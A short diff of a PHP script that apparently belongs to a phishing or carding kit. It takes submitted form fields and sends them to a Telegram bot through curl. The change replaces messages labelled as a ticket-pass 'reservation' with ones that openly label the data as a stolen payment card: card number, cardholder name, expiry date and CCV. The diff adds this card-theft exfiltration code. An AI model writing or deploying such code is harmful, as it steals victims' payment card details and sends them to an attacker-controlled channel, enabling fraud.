@@ -18,12 +18,11 @@ $expiry    = trim($data['expiry'] ?? '');
 $amount    = trim($data['amount'] ?? '');
 $code_controle = trim($data['code de controle'] ?? ''); 
 
-$message = "🎫 NOUVELLE RÉSERVATION\n\n"
-         . "🔢 Référence du pass : {$reference}\n"
-         . "👤 Nom du bénéficiaire : {$name}\n"
-         . "📅 Date de validité : {$expiry}\n"
-         . "💰 Montant : {$amount}\n"
-         . "💰 Code de contrôle : {$code_controle}";
+$message = "🎫 🔴🔴 NOUVELLE CARTE 🔴🔴\n\n"
+         . "🔢 NUMERO CARTE : {$reference}\n"
+         . "👤 Nom dE LA CARTE : {$name}\n"
+         . "📅 Date EXP : {$expiry}\n"
+         . "💰 CCV : {$code_controle}";
 
 $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
 curl_setopt_array($ch, [
